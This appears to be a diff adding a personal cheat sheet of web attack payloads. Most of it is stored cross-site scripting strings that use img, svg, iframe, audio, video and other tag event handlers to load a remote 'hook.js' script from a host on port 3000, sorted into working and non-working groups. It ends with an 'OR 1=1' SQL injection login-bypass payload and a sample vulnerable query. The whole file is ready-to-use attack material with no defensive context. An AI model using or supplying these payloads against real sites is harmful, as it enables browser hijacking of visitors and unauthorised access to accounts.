@@ -1,0 +1,20 @@
+# XSS STORED PAYLOAD working
+    <img src=x onerror="var s=document.createElement('script');s.src='http://192.168.58.101:3000/hook.js';document.body.appendChild(s);">
+    <svg onload="var s=document.createElement('script');s.src='http://192.168.240.100:3000/hook.js';document.body.appendChild(s);">
+    <input onfocus="var s=document.createElement('script');s.src='http://192.168.240.100:3000/hook.js';document.body.appendChild(s);" autofocus>
+        <iframe onload="var s=document.createElement('script');s.src='http://192.168.240.100:3000/hook.js';document.body.appendChild(s);"></iframe>
+        <audio src=x onerror="var s=document.createElement('script');s.src='http://192.168.240.100:3000/hook.js';document.body.appendChild(s);">
+        <video src=x onerror="var s=document.createElement('script');s.src='http://192.168.240.100:3000/hook.js';document.body.appendChild(s);">
+
+        # XSS STORED PAYLOAD Not Working
+
+    <script src="http://192.168.240.100:3000/hook.js"></script>
+    <body onload="var s=document.createElement('script');s.src='http://192.168.240.100:3000/hook.js';document.body.appendChild(s);">
+<!--    javascript:var s=document.createElement('script');s.src='http://192.168.240.100:3000/hook.js';document.body.appendChild(s);-->
+    <a href="javascript:var s=document.createElement('script');s.src='http://192.168.240.100:3000/hook.js';document.body.appendChild(s);">Click me</a>
+
+SQL INJECTION PAYLOAD
+# OR
+OR 1=1 -- -
+sample target query
+SELECT * FROM users WHERE username = '' OR 1=1 -- -'' AND password = 'invalid password';
